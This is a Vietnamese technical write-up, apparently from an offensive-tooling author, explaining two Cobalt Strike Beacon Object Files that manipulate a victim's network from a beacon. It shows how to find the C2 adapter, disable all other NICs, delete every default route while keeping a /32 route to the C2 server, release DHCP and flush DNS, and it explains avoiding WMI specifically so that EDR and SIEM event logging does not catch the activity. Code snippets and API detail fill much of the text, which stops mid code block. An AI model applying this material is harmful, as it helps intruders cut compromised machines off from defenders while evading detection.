# Giải thích Code Chi Tiết — BOF Network Control
# (Không dùng WMI, không dùng CRT, không spawn process)

---

## Tại sao KHÔNG dùng WMI — phân tích kỹ

### WMI là gì?

WMI (Windows Management Instrumentation) là một layer abstraction của Microsoft cho phép
query và control toàn bộ Windows bằng 1 interface thống nhất. Về bản chất:

```
Application
    │
    │  CoCreateInstance(IWbemLocator)
    ▼
WMI Service (winmgmt — chạy như SYSTEM service)
    │
    │  WQL query: "SELECT * FROM Win32_NetworkAdapter WHERE ..."
    ▼
WMI Provider (Network provider DLL)
    │  Nói chuyện với kernel qua driver
    ▼
Kernel / driver
```

Mọi thứ qua WMI đều đi qua ít nhất **5 layer**. Win32 API trực tiếp đi thẳng vào
kernel syscall.

---

### Tại sao WMI không phù hợp với BOF?

#### Lý do 1: WMI yêu cầu COM — COM không hoạt động trong BOF

Để dùng WMI phải init COM trước:

```c
CoInitializeEx(NULL, COINIT_MULTITHREADED);   // init COM apartment
CoInitializeSecurity(...);                     // set security descriptor
CoCreateInstance(CLSID_WbemLocator, ...);     // tạo WMI locator object
IWbemLocator->ConnectServer(L"ROOT\\CIMV2", ...); // connect đến WMI namespace
```

**Vấn đề với BOF:**
- BOF chạy trong beacon thread — COM apartment đã được init bởi host process (không phải mình)
- Gọi `CoInitializeEx` lại từ thread khác với apartment type khác → crash hoặc undefined behavior
- `CoInitializeSecurity` chỉ được gọi 1 lần per process — nếu host process đã gọi rồi → fail
- Khi BOF kết thúc, nếu đã `CoInitializeEx` thì cần `CoUninitialize` — nếu quên → leak reference

#### Lý do 2: WMI tạo artifact có thể bị phát hiện

Khi dùng WMI, Windows ghi **Event Log**:

```
Event ID 5857: WMI provider load
    Provider: Win32_NetworkAdapter
    ProviderGuid: {DA3DC5BA-...}
    
Event ID 5858: WMI query execution  
    Operation: ExecQuery
    Query: SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionID='Ethernet0'
    
Event ID 5860: Method invocation
    Class: Win32_NetworkAdapter
    Method: Disable
    User: DOMAIN\Administrator
```

EDR và SIEM theo dõi các event này vì WMI abuse rất phổ biến (malware dùng WMI để
persistence, lateral movement, execution). Các rule detection cụ thể:
- Sigma: `win_wmi_class_networkadapter_method`
- Sysmon Event ID 19/20/21: WMI Event subscription

Win32 API trực tiếp (`CM_Disable_DevNode`) **không tạo ra event nào** loại này.

#### Lý do 3: WMI chậm hơn 10-100x

```
WMI approach:
    CoInitialize → connect WMI → query → wait for provider → execute method
    Tổng: 100-500ms mỗi operation
    (WMI service phải load provider DLL, parse WQL, execute)

Win32 API trực tiếp:
    CM_Disable_DevNode → kernel call
    Tổng: < 5ms
```

BOF nên chạy nhanh và return — không block beacon thread quá lâu.

#### Lý do 4: WMI không available trong mọi context

WMI service (`winmgmt`) có thể bị disabled, stopped, hoặc corrupt.
`CM_Get_Device_ID_ListW` gọi thẳng PnP manager qua NtPlugPlayControl syscall — luôn hoạt động
khi Windows đang chạy.

---

### So sánh trực tiếp: disable NIC

**Dùng WMI (C# pseudo-code):**
```csharp
// ~50 dòng, 5 COM call, 100-500ms, tạo Event 5857/5858/5860
ManagementObjectSearcher searcher = new ManagementObjectSearcher(
    "SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionID='Ethernet'");
foreach (ManagementObject obj in searcher.Get()) {
    obj.InvokeMethod("Disable", null);
}
```

**Win32 API trực tiếp (BOF):**
```c
// ~20 dòng, 2 syscall, <5ms, không có WMI event
CM_Locate_DevNodeW(&devInst, deviceId, CM_LOCATE_DEVNODE_PHANTOM);
CM_Disable_DevNode(devInst, CM_DISABLE_POLITE | CM_DISABLE_UI_NOT_OK);
```

---

## API Reference — Tại sao mỗi API được chọn

### Group 1: Tìm C2 adapter

#### `GetBestInterface(IPAddr dest, PDWORD ifIdx)`
**DLL:** `iphlpapi.dll`

```
Input:  IP đích dưới dạng DWORD (network byte order)
Output: Interface index của NIC tốt nhất để route đến IP đó

Cơ chế: Tra routing table của Windows kernel (FIB — Forwarding Information Base)
        Tương đương: "route print" → tìm longest prefix match cho IP đó
```

**Tại sao dùng cái này thay vì liệt kê và so sánh IP?**

C2 IP (ví dụ 192.168.163.183) là IP của *server từ xa*, không phải IP của victim.
Không có NIC nào của victim có IP đó. Phải hỏi Windows "muốn gửi packet đến
192.168.163.183 thì dùng NIC nào?" — đó là `GetBestInterface`.

```
Routing table victim:
  0.0.0.0/0      via 192.168.163.2  (VMnet8, ifIdx=11)
  192.168.163.0/24 on 192.168.163.128 (VMnet8, ifIdx=11)

GetBestInterface(192.168.163.183) → 11  (longest prefix match: /24 rule)
```

#### `GetAdaptersAddresses(family, flags, reserved, buffer, &size)`
**DLL:** `iphlpapi.dll`

```
Output: Linked list IP_ADAPTER_ADDRESSES — mỗi node là 1 NIC với:
    - AdapterName: GUID dạng char* "{7550ABB7-...}"
    - FriendlyName: WCHAR* "Ethernet0", "Wi-Fi"
    - PhysicalAddress: BYTE[8] MAC address + PhysicalAddressLength
    - FirstUnicastAddress: linked list IP addresses
    - FirstDnsServerAddress: linked list DNS servers
    - IfIndex: interface index (match với GetBestInterface output)
    - IfType: IF_TYPE_ETHERNET_CSMACD, IF_TYPE_SOFTWARE_LOOPBACK, ...
    - OperStatus: IfOperStatusUp, IfOperStatusDown, ...
```

Dùng để:
1. Tìm adapter có `IfIndex == c2IfIdx` → lấy `AdapterName` (GUID của C2)
2. Trong `dhcp-check`: hiển thị MAC, IP, DNS, FriendlyName

**Flags quan trọng:**
- `GAA_FLAG_SKIP_DNS_SERVER`: bỏ qua linked list DNS (dùng khi không cần DNS)
- `GAA_FLAG_SKIP_ANYCAST`, `GAA_FLAG_SKIP_MULTICAST`: bỏ qua anycast/multicast addr

---

### Group 2: DHCP release/renew

#### `GetAdaptersInfo(buffer, &size)`
**DLL:** `iphlpapi.dll` — API cũ (Windows 98+)

```
Output: Linked list IP_ADAPTER_INFO — mỗi node có:
    - AdapterName: char[260] — GUID "{7550ABB7-...}"
    - IpAddressList.IpAddress.String: "192.168.163.128"
    - IpAddressList.IpMask.String: "255.255.255.0"
    - GatewayList.IpAddress.String: "192.168.163.2"
    - DhcpEnabled: UINT (0 hoặc 1)
    - DhcpServer.IpAddress.String: "192.168.163.254"
```

Không có trong `GetAdaptersAddresses` mới: `DhcpEnabled`, `DhcpServer`. Phải dùng
cả 2 API và join bằng GUID.

#### `GetInterfaceInfo(buffer, &size)`
**DLL:** `iphlpapi.dll`

```
Output: IP_INTERFACE_INFO chứa mảng IP_ADAPTER_INDEX_MAP:
    struct IP_ADAPTER_INDEX_MAP {
        ULONG  Index;                    // interface index
        WCHAR  Name[MAX_ADAPTER_NAME];   // L"\\DEVICE\\TCPIP_{GUID}"
    };
```

**Tại sao cần cái này?** Vì `IpReleaseAddress` và `IpRenewAddress` không nhận
GUID hay IP — chỉ nhận `IP_ADAPTER_INDEX_MAP*`. Không có cách nào khác.

```
Chuỗi: GUID (char*) → tìm trong Name (WCHAR*) → lấy Index_MAP → IpReleaseAddress
```

#### `IpReleaseAddress(IP_ADAPTER_INDEX_MAP*)` / `IpRenewAddress(...)`
**DLL:** `iphlpapi.dll`

```
IpReleaseAddress:
    Gửi DHCP RELEASE unicast đến DHCP server
    Windows xóa IP khỏi adapter
    Adapter nhận IP 0.0.0.0 hoặc không IP

IpRenewAddress:
    Gửi DHCP DISCOVER broadcast (hoặc REQUEST nếu còn lease info)
    Chờ DHCP OFFER từ server
    Gửi DHCP REQUEST
    Nhận DHCP ACK → assign IP
    Nếu không có server: nhận APIPA 169.254.x.x sau 60 giây
```

**Tại sao không thể dùng API khác để release?**

Không có WinAPI nào khác làm được DHCP release. `SetIpAddress` (deprecated) chỉ set
IP tĩnh. `DeleteUnicastIpAddressEntry` xóa IP khỏi stack nhưng không gửi DHCP RELEASE
packet đến server. Chỉ `IpReleaseAddress` mới làm đúng theo DHCP protocol.

---

### Group 3: Routing table

#### `GetIpForwardTable2(AF_INET, &table)`
**DLL:** `iphlpapi.dll`

```
Output: MIB_IPFORWARD_TABLE2 → mảng MIB_IPFORWARD_ROW2:
    struct MIB_IPFORWARD_ROW2 {
        NET_LUID       InterfaceLuid;   // interface identifier (64-bit)
        NET_IFINDEX    InterfaceIndex;  // interface index
        IP_ADDRESS_PREFIX DestinationPrefix; // dest IP + prefix length
        SOCKADDR_INET  NextHop;         // gateway IP
        ULONG          Metric;          // route metric
        NL_ROUTE_PROTOCOL Protocol;     // how route was added (static, DHCP, etc.)
        ...
    };
```

Thay thế cũ: `GetIpForwardTable` (32-bit only) — bản 2 hỗ trợ cả IPv6.

#### `CreateIpForwardEntry2` / `DeleteIpForwardEntry2`
**DLL:** `iphlpapi.dll`

Thêm/xóa route trong kernel routing table. **Yêu cầu bắt buộc:**
- `Protocol = 3` (RouteProtocolNetMgmt) — nếu để 0 → `ERROR_INVALID_PARAMETER`
- `ValidLifetime = 0xFFFFFFFF` — route không expire
- `InterfaceLuid` PHẢI đúng (không thể chỉ set `InterfaceIndex`)

Đây là lý do cần `init_route_row()` — struct `MIB_IPFORWARD_ROW2` có 104 bytes, nhiều
field ẩn phải đúng. `InitializeIpForwardEntry()` trong SDK là **inline function** — không
export từ DLL, BOF không thể import.

#### `FreeMibTable(void*)`
**DLL:** `iphlpapi.dll`

`GetIpForwardTable2` allocate buffer nội bộ và trả về pointer. **Không được** dùng
`HeapFree` hay `free()` để free — phải dùng `FreeMibTable`. Lý do: buffer được alloc
bởi iphlpapi heap, không phải process heap.

---

### Group 4: PnP device manager (cfgmgr32)

#### `CM_Get_Device_ID_ListW(filter, buffer, len, flags)`
**DLL:** `cfgmgr32.dll`

```
Output: Multi-string WCHAR buffer:
    "PCI\VEN_15AD&DEV_07B0\4&2B7C36E\0"
    "PCI\VEN_8086&DEV_100F\FF&0\0"
    "ROOT\NET\0000\0"
    "\0"  ← double null = end of list
```

Đây là **PnP Device Instance ID** — địa chỉ của device trên PnP bus. Không phải
GUID mạng! Phải đọc registry để lấy GUID mạng.

**`CM_GETIDLIST_FILTER_CLASS (0x200)`:** Chỉ lấy device trong class `{4D36E972...}`
(Network Adapters). Chỉ có từ Windows 8. Windows 7 → fallback về filter=0 (lấy tất cả
device, `cm_read_net_guid_w` tự skip non-network device bằng cách check `{` ở đầu GUID).

#### `CM_Locate_DevNodeW(devInst, deviceId, flags)`
**DLL:** `cfgmgr32.dll`

Chuyển Device Instance ID string → `DEVINST` handle (DWORD) — handle này dùng cho mọi
CM operation tiếp theo.

**`CM_LOCATE_DEVNODE_PHANTOM (0x1)`:** Bắt buộc để tìm device đã disabled. Device bị
disable không "present" trong view thông thường — là "phantom node". Nếu không dùng flag
này, device đang disabled sẽ không tìm thấy.

#### `CM_Open_DevNode_Key(devInst, KEY_READ, 0, RegDisposition_OpenExisting, &hKey, CM_REGISTRY_SOFTWARE)`
**DLL:** `cfgmgr32.dll`

Mở registry key của device. `CM_REGISTRY_SOFTWARE` → mở:
```
HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972...}\0001
```
Key này chứa driver và network config của adapter, trong đó có `NetCfgInstanceId`.

Sau khi có `hKey` → dùng `RegQueryValueExW` bình thường.

#### `CM_Get_DevNode_Status(&status, &problem, devInst, 0)`
**DLL:** `cfgmgr32.dll`

```
status bits:
    DN_STARTED (0x8): driver đang chạy → device ENABLED
    DN_HAS_PROBLEM (0x400): có vấn đề → check problem code

problem codes:
    CM_PROB_DISABLED (0x16 = 22): device bị user disable
    CM_PROB_DISABLED_SERVICE: driver service bị disabled
```

Logic: `problem == CM_PROB_DISABLED` → DISABLED; `status & DN_STARTED` → ENABLED.

#### `CM_Disable_DevNode(devInst, flags)` / `CM_Enable_DevNode(devInst, 0)`
**DLL:** `cfgmgr32.dll`

Tương đương click "Disable"/"Enable" trong Device Manager nhưng không cần UI.

**`CM_DISABLE_POLITE (0x1)`:** Hỏi driver "có muốn veto không?". Nếu driver veto
(ví dụ device đang busy), disable sẽ fail với `CR_NOT_DISABLEABLE`.

**`CM_DISABLE_UI_NOT_OK (0x2)`:** Ngăn PnP manager hiện dialog UI. Quan trọng trong
Session 0 (SYSTEM context) — dialog không có window station để hiện → treo vô hạn.

---

### Group 5: DNS

#### `DnsFlushResolverCache()`
**DLL:** `dnsapi.dll`

API đơn giản nhất — 1 call, không cần argument, flush toàn bộ DNS cache của resolver.

Tương đương `ipconfig /flushdns` nhưng không spawn process.

Cache được lưu trong DNS Client service (`dnscache` — `svchost.exe`). Function này gửi
RPC đến service để clear cache. Nếu DNS Client service bị stopped → fail (trả về FALSE).

---

### Group 6: Memory và string

#### `HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)` / `HeapFree(...)`
**DLL:** `kernel32.dll`

BOF không có CRT linker → không có `malloc`/`free`. `HeapAlloc` là Win32 API trực tiếp.

`HEAP_ZERO_MEMORY`: zero toàn bộ block sau alloc. Quan trọng vì:
```c
IP_ADAPTER_ADDRESSES *p = HeapAlloc(...);
// Nếu không zero: p->Next có random pointer → khi loop "for(; p; p=p->Next)"
// sẽ đọc random memory → crash
```

IP Helper API struct có linked list (`Next` pointer), MIB struct có nhiều field ẩn —
phải zero trước khi dùng.

#### `WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dstLen, NULL, NULL)`
**DLL:** `kernel32.dll`

Dùng trong bản `_w`. Chuyển WCHAR → UTF-8 char string.

`CP_UTF8 (65001)`: encode standard. Ký tự ngoài ASCII (tiếng Việt, Hán) được encode
thành 2-4 byte UTF-8. Nếu dùng `CP_ACP` (Windows-1252) thì ký tự Unicode ngoài
codepage đó sẽ bị replace bằng `?`.

`src_len = -1`: tự tính length đến null terminator.

```
L"Kết nối" (7 WCHAR)  →  CP_UTF8  →  "K\xE1\xBA\xBFt n\xE1\xBB\x91i" (13 bytes)
L"Ethernet0" (9 WCHAR) →  CP_UTF8  →  "Ethernet0" (9 bytes, ASCII unchanged)
```

#### `MultiByteToWideChar(CP_ACP, 0, src, -1, dst, dstCch)`
**DLL:** `kernel32.dll`

Chiều ngược: char GUID → WCHAR GUID (cho cfgmgr32 comparison).

`CP_ACP`: dùng cho GUID vì `AdapterName` luôn là ASCII `{hex-digits-and-dashes}`.
Với ASCII, `CP_ACP` = `CP_UTF8` = code point 0x00-0x7F, không khác nhau.

---

## Tổng quan kiến trúc

```
Cobalt Strike Beacon (process đang chạy trên victim)
    │
    │  beacon_inline_execute(bid, obj_bytes, "go", args)
    │
    ▼
BOF Loader (built-in CS)
    │  1. Nạp COFF object file vào memory
    │  2. Resolve các import symbol (DLL$Function → GetProcAddress)
    │  3. Apply relocations
    │  4. Gọi hàm go(args, len)
    │
    ▼
go() chạy trong beacon thread
    │  Gọi Win32 API trực tiếp
    │  Dùng BeaconPrintf() để gửi output về CS teamserver
    ▼
Done — không có process mới, không có file trên disk
```

---

## Tại sao KHÔNG dùng WMI?

WMI (Windows Management Instrumentation) là framework Microsoft tạo ra để query/control
Windows components qua interface thống nhất. Ví dụ disable NIC bằng WMI:

```csharp
// WMI approach (C#)
ManagementObject nic = ...; 
nic.InvokeMethod("Disable", null);
```

**Vấn đề với WMI trong BOF:**

| Vấn đề | Chi tiết |
|--------|---------|
| Cần COM | WMI chạy trên COM (CoInitialize, CoCreateInstance...) — phức tạp trong BOF |
| Cần IWbemLocator | Phải connect đến WMI service qua RPC |
| Chậm | WMI query mất 100-500ms, BOF cần nhanh |
| EDR theo dõi | WMI execution bị log trong Event ID 5857/5858/5860 |
| Không cần thiết | Win32 API làm được mọi thứ WMI làm, trực tiếp hơn |

**Thay vào đó dùng Win32 API trực tiếp:**
- `cfgmgr32.dll` → disable/enable NIC
- `iphlpapi.dll` → DHCP, routing table
- `advapi32.dll` → đọc registry
- `dnsapi.dll` → flush DNS cache
- `kernel32.dll` → cấp phát memory

---

## File 1: `bof_disable_nic.c`

### Cấu trúc tổng thể

```
go(args, len)
    │
    ├── parse args: c2ip (string), action (int)
    ├── get_c2_guid()        → tìm GUID của C2 adapter
    │
    ├── action == 0 → action_disable()   [nic-off]
    ├── action == 1 → action_enable()    [nic-on]
    ├── action == 2 → action_list()      [nic-list]
    ├── action == 3 → action_isolate()   [nic-isolate]
    └── action == 4 → action_restore()   [nic-restore]
```

---

### Bước 1: Tìm C2 adapter — `get_c2_guid()`

```c
static BOOL get_c2_guid(const char *c2ip, char *guidOut, DWORD guidLen, DWORD *ifIdxOut)
```

**Mục đích:** Biết IP của C2 server (ví dụ "192.168.163.183"), tìm ra adapter nào
đang được dùng để route đến IP đó. Adapter này phải được bảo vệ — không được disable.

**Cách hoạt động:**

```
Bước 1: parse_ipv4("192.168.163.183") → DWORD (network byte order)

Bước 2: GetBestInterface(c2_addr, &ifIdx)
    → Windows tra routing table
    → Trả về ifIdx = interface index của adapter tốt nhất để đến C2
    → Ví dụ: ifIdx = 11

Bước 3: GetAdaptersAddresses(AF_UNSPEC, flags, NULL, buffer, &len)
    → Liệt kê tất cả adapter
    → Tìm adapter có IfIndex == 11
    → Đọc AdapterName = "{7550ABB7-F59D-49BC-BAAB-A3E513741037}"
    → Đây là GUID của C2 adapter
```

**Tại sao dùng `GetBestInterface` thay vì so sánh IP?**

Không thể so sánh IP trực tiếp vì C2 IP (192.168.163.183) là IP của *server*, không phải
IP của *adapter* victim (192.168.163.128). `GetBestInterface` hỏi Windows "nếu tôi muốn
gửi packet đến 192.168.163.183, tôi dùng NIC nào?" — chính xác 100%.

---

### Bước 2: Enumerate NIC — `cm_get_net_id_list()`

```c
static WCHAR *cm_get_net_id_list(DWORD *pCount)
```

**Mục đích:** Lấy danh sách tất cả device ID của các network adapter trong hệ thống.

**Cách hoạt động:**

```
Bước 1: Thử CM_GETIDLIST_FILTER_CLASS (Win8+)
    CM_Get_Device_ID_List_SizeW(&len, L"{4D36E972...}", 0x200)
    → Nếu OK: chỉ trả về NET class devices (nhanh, ít device hơn)
    → Nếu fail (Win7): fallback về filter = 0 (enumerate tất cả)

Bước 2: Allocate buffer = len * sizeof(WCHAR)

Bước 3: CM_Get_Device_ID_ListW(filter, buf, len, flags)
    → buf chứa danh sách device ID, cách nhau bằng null character:
    "PCI\VEN_15AD...\0PCI\VEN_8086...\0\0"
    (double null = kết thúc list)
```

**Tại sao dùng cfgmgr32 thay vì SetupAPI?**

`SetupDiGetClassDevsW` (SetupAPI) trả về 0 device trong beacon context vì:
- SetupAPI cần window station (desktop session)
- Beacon chạy trong Session 0, không có window station thật

`CM_Get_Device_ID_ListW` dùng PnP RPC bus — không cần window station, hoạt động
trong mọi session kể cả Session 0 (SYSTEM service context).

**Tại sao có fallback về filter = 0?**

`CM_GETIDLIST_FILTER_CLASS (0x200)` chỉ có từ Windows 8. Trên Windows 7 trả về
`CR_INVALID_FLAG`. Fallback về 0 enumerate tất cả PnP device (nhiều hơn) nhưng
`cm_read_net_guid()` sẽ tự skip các device không phải network adapter.

---

### Bước 3: Đọc GUID của adapter — `cm_read_net_guid()`

```c
static BOOL cm_read_net_guid(DEVINST devInst, char *guidOut, DWORD guidLen)
```

**Vấn đề:** Device Instance ID từ CM trông như thế này:
```
PCI\VEN_15AD&DEV_07B0&SUBSYS_07B015AD&REV_01\4&2B7C36E&0&00A8
```
Đây là địa chỉ phần cứng trên PnP bus — không dùng được để tìm adapter trong IP stack.

**Cần đọc:** `NetCfgInstanceId` = GUID mà Network Config Manager gán cho adapter:
```
{7550ABB7-F59D-49BC-BAAB-A3E513741037}
```
Đây là GUID mà `GetAdaptersAddresses.AdapterName` trả về — dùng để cross-reference.

**Cách đọc:**

```
CM_Open_DevNode_Key(devInst, KEY_READ, 0,
    RegDisposition_OpenExisting, &hKey, CM_REGISTRY_SOFTWARE)
→ Mở registry key của device:
   HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972...}\0001

RegQueryValueExW(hKey, L"NetCfgInstanceId", ...)
→ Đọc value "NetCfgInstanceId"
→ Kết quả: L"{7550ABB7-F59D-49BC-BAAB-A3E513741037}"
```

Non-network device (USB, disk...) không có key này → return FALSE → tự skip.

---

### Bước 4: Kiểm tra trạng thái — `cm_device_state()`

```c
static int cm_device_state(DEVINST devInst)
// Returns: 1=ENABLED, 0=DISABLED, -1=UNKNOWN (phantom)
```

```
CM_Get_DevNode_Status(&status, &problem, devInst, 0)
    │
    ├── problem == CM_PROB_DISABLED  → return 0 (DISABLED)
    ├── status & DN_STARTED          → return 1 (ENABLED, driver running)
    └── else                         → return -1 (UNKNOWN/phantom)
```

**Tại sao cần check state trước khi operate?**

- Không disable device đã disabled (tránh error CR_INVALID_DEVICE_ID)
- Không enable device đang enabled
- Skip phantom device (state = -1) — virtual adapter không present

---

### Action: DISABLE — `action_disable()`

```
for mỗi device trong CM list:
    1. cm_read_net_guid() → đọc GUID
    2. So sánh với c2Guid → nếu khớp: skip (in "[C2] skip")
    3. cm_device_state() → nếu không phải ENABLED (1): skip
    4. release_dhcp()    → IpReleaseAddress() trước khi disable
    5. CM_Disable_DevNode(devInst, CM_DISABLE_POLITE | CM_DISABLE_UI_NOT_OK)
    6. Verify: cm_device_state() lại → in kết quả
```

**Tại sao release DHCP trước khi disable?**

Nếu disable NIC mà không release DHCP:
- DHCP server vẫn "nghĩ" IP đó đang được dùng
- IP bị "giữ" cho đến hết lease time (có thể 24h)
- Khi enable lại, có thể nhận IP khác

Release trước → DHCP server biết IP được trả → clean.

**`CM_DISABLE_POLITE`:** Hỏi driver trước ("có OK để stop không?") thay vì
force stop ngay.

**`CM_DISABLE_UI_NOT_OK`:** Không cho phép pop dialog UI. Quan trọng trong
Session 0 — nếu PnP cố show dialog sẽ treo.

---

### Action: ISOLATE — `action_isolate()`

**Mục đích:** Cắt internet victim nhưng giữ beacon sống. Chỉ thay đổi routing table,
không động đến hardware.

```
Bước 1: GetIpForwardTable2(AF_INET, &pTbl)
    → Đọc toàn bộ IPv4 routing table

Bước 2: Tìm default route trên C2 interface
    → Tìm entry có:
       DestinationPrefix.PrefixLength == 0  (0.0.0.0/0)
       DestinationPrefix.sin_addr == 0      (0.0.0.0)
       InterfaceIndex == c2IfIdx
    → Lưu lại NextHop (gateway IP, ví dụ 192.168.163.2)

Bước 3: Thêm route C2/32
    init_route_row(&c2Route)  ← zero struct + set required fields
    c2Route.DestinationPrefix = C2_IP/32
    c2Route.NextHop = gateway từ bước 2
    CreateIpForwardEntry2(&c2Route)
    → Route table: 192.168.163.183/32 via 192.168.163.2

Bước 4: Xóa TẤT CẢ default routes (0.0.0.0/0)
    for mỗi entry trong table:
        if PrefixLength == 0 và sin_addr == 0:
            DeleteIpForwardEntry2(entry)
    → Route table: không còn 0.0.0.0/0 nữa
```

**Kết quả:**
```
Victim gửi packet đến google.com (142.250.x.x):
    Windows lookup route table
    → Không có route cho 142.250.x.x
    → Không có 0.0.0.0/0 (đã xóa)
    → NETWORK UNREACHABLE ✗

Beacon gửi packet đến 192.168.163.183:
    Windows lookup route table
    → Có route 192.168.163.183/32 via 192.168.163.2
    → Forward đến gateway ✓
```

**Tại sao cần `init_route_row()` thay vì `InitializeIpForwardEntry()`?**

`InitializeIpForwardEntry` là **inline function** trong `netioapi.h` — không có trong
DLL export table. BOF không thể import inline function. Phải tự implement:

```c
static void init_route_row(MIB_IPFORWARD_ROW2 *r) {
    // Zero toàn bộ struct (thay thế memset — không dùng CRT)
    BYTE *p = (BYTE *)r;
    for (SIZE_T i = 0; i < sizeof(MIB_IPFORWARD_ROW2); i++) p[i] = 0;
    // Set các field bắt buộc (giống InitializeIpForwardEntry)
    r->ValidLifetime     = 0xFFFFFFFF;
    r->PreferredLifetime = 0xFFFFFFFF;
    r->Protocol          = 3;  // RouteProtocolNetMgmt
    r->SitePrefixLength  = 255;
}
```

`Protocol = 3` (RouteProtocolNetMgmt) là bắt buộc — nếu để 0, `CreateIpForwardEntry2`
trả về `ERROR_INVALID_PARAMETER`.

---

## File 2: `bof_dhcp.c`

### Cấu trúc tổng thể

```
go(args, len)
    │
    ├── action == 3 → action_flushdns()  ← xử lý trước, không cần C2 GUID
    │
    ├── get_c2_guid() → tìm C2 adapter
    │
    ├── action == 0 → action_release()   [dhcp-off]
    ├── action == 1 → action_renew()     [dhcp-on]
    └── action == 2 → action_check()     [dhcp-check / ipconfig /all]
```

---

### `action_check()` — ipconfig /all

**Cần 2 nguồn dữ liệu khác nhau:**

```
GetAdaptersInfo()
    → IP address, subnet mask
    → Gateway
    → DHCP enabled/disabled
    → DHCP server IP

GetAdaptersAddresses() (không skip DNS)
    → MAC address (PhysicalAddress)
    → Friendly name (FriendlyName) — tên hiển thị "Ethernet0"
    → DNS servers (FirstDnsServerAddress linked list)
```

**Tại sao cần 2 API riêng?**

`GetAdaptersInfo` là API cũ (Windows 98+) — có đầy đủ DHCP info nhưng không có MAC
(chỉ có `Address[]` dạng raw bytes, không có length) và không có DNS servers.

`GetAdaptersAddresses` là API mới (XP SP1+) — có MAC với length, có friendly name,
có DNS servers, nhưng không có DHCP server IP trực tiếp.

Phải dùng cả 2 và cross-reference qua GUID:

```c
// Loop qua GetAdaptersInfo
for (PIP_ADAPTER_INFO a = pInfo; a; a = a->Next) {
    // Tìm entry tương ứng trong GetAdaptersAddresses
    PIP_ADAPTER_ADDRESSES pEntry = find_aa_by_guid(pAA, a->AdapterName);
    // Từ pInfo: IP, mask, gateway, DHCP
    // Từ pEntry: MAC, friendly name, DNS
}
```

**DNS servers — linked list:**

```c
for (PIP_ADAPTER_DNS_SERVER_ADDRESS dns = pEntry->FirstDnsServerAddress;
     dns; dns = dns->Next) {
    // Mỗi dns là 1 DNS server
    // dns->Address.lpSockaddr → SOCKADDR_IN → sin_addr → 4 bytes IP
}
```

---

### `action_release()` — ipconfig /release

**Vấn đề:** `IpReleaseAddress` không nhận GUID hay IP. Nó nhận `IP_ADAPTER_INDEX_MAP`:

```c
typedef struct _IP_ADAPTER_INDEX_MAP {
    ULONG  Index;              // interface index
    WCHAR  Name[MAX_ADAPTER_NAME];  // L"\\DEVICE\\TCPIP_{GUID}"
} IP_ADAPTER_INDEX_MAP;
```

**Pipeline:**

```
GetAdaptersInfo() → danh sách adapter với GUID
    ↓
GetInterfaceInfo() → danh sách IP_ADAPTER_INDEX_MAP
    ↓
find_if_map(pIf, guid):
    for mỗi Adapter[i] trong InterfaceInfo:
        wchar_to_char(Adapter[i].Name) → narrow string
        str_has(narrow, guid) → tìm GUID trong chuỗi Name
        → Nếu tìm thấy: return &Adapter[i]
    ↓
IpReleaseAddress(&Adapter[i])
    → Gửi DHCP RELEASE packet
    → Windows xóa IP khỏi adapter
```

**str_has() — tìm substring:**

`IP_ADAPTER_INDEX_MAP.Name` có dạng `\DEVICE\TCPIP_{7550ABB7-...}`. Không thể so
sánh bằng `str_ieq` (equal) mà phải dùng `str_has` (substring) để tìm GUID trong chuỗi.

---

### `action_flushdns()` — ipconfig /flushdns

```c
static void action_flushdns(void) {
    BOOL ok = DNSAPI$DnsFlushResolverCache();
    ...
}
```

Đơn giản nhất trong tất cả — 1 API call vào `dnsapi.dll`.

**Tại sao xử lý trước get_c2_guid() trong go()?**

```c
// Trong go():
if (action == 3) {
    action_flushdns();
    return;
}
// Chỉ sau đó mới gọi get_c2_guid()
```

Flush DNS là system-wide, không liên quan đến adapter nào. Nếu để sau
`get_c2_guid()`, có thể fail nếu C2 IP detection lỗi → flush không chạy.

---

## Các helper function

### `parse_ipv4()` — tự viết thay vì inet_addr

```c
static DWORD parse_ipv4(const char *s) {
    DWORD r = 0; BYTE *b = (BYTE *)&r;
    for (int i = 0; i < 4; i++) {
        DWORD v = 0;
        while (*s >= '0' && *s <= '9') { v = v*10 + (*s-'0'); s++; }
        if (i < 3 && *s == '.') s++;
        b[i] = (BYTE)v;
    }
    return r;
}
```

**Tại sao không dùng `inet_addr`?**

BOF không có C runtime (CRT). `inet_addr` là từ `WS2_32.DLL` — có thể import được,
nhưng cần thêm `WS2_32$inet_addr` declaration. Tự viết parser ngắn hơn và không thêm
dependency. `inet_addr` cũng đã deprecated từ Vista.

**Lưu ý byte order:**

`parse_ipv4("192.168.163.183")` lưu vào memory theo thứ tự:
```
b[0]=192, b[1]=168, b[2]=163, b[3]=183
```
Đây đúng là **network byte order** — `GetBestInterface` nhận đúng format này.

### `wchar_to_char()` — tự viết thay vì WideCharToMultiByte

```c
static void wchar_to_char(const WCHAR *src, char *dst, int dstLen) {
    int i = 0;
    while (src[i] && i < dstLen - 1) { dst[i] = (char)src[i]; i++; }
    dst[i] = '\0';
}
```

Cast đơn giản WCHAR → char. Hoạt động đúng cho ASCII (tên adapter, GUID) — không cần
handle full Unicode. Tránh import `WideCharToMultiByte` từ kernel32.

### `HALLOC / HFREE` — thay vì malloc/free

```c
#define HALLOC(n) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (n))
#define HFREE(p)  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))
```

BOF không có CRT → không có `malloc`/`free`. Dùng Win32 Heap API trực tiếp.

`HEAP_ZERO_MEMORY`: tự động zero memory sau alloc — quan trọng vì các IP Helper
struct có linked list pointer, nếu không zero sẽ có garbage pointer gây crash.

---

## Tại sao KHÔNG dùng CRT (C Runtime)?

| CRT Function | Thay thế trong BOF |
|-------------|-------------------|
| `malloc` / `free` | `HeapAlloc` / `HeapFree` |
| `memset` | manual loop |
| `memcpy` | manual loop |
| `strlen` | manual loop |
| `strcmp` | `str_ieq()` tự viết |
| `strstr` | `str_has()` tự viết |
| `sprintf` | `BeaconPrintf()` |
| `inet_addr` | `parse_ipv4()` tự viết |

BOF là COFF object file — không có runtime linker nạp CRT. Mọi dependency
phải là Win32 API (resolve qua GetProcAddress lúc runtime).

---

## Import declaration — tại sao dùng `DLL$Function`?

```c
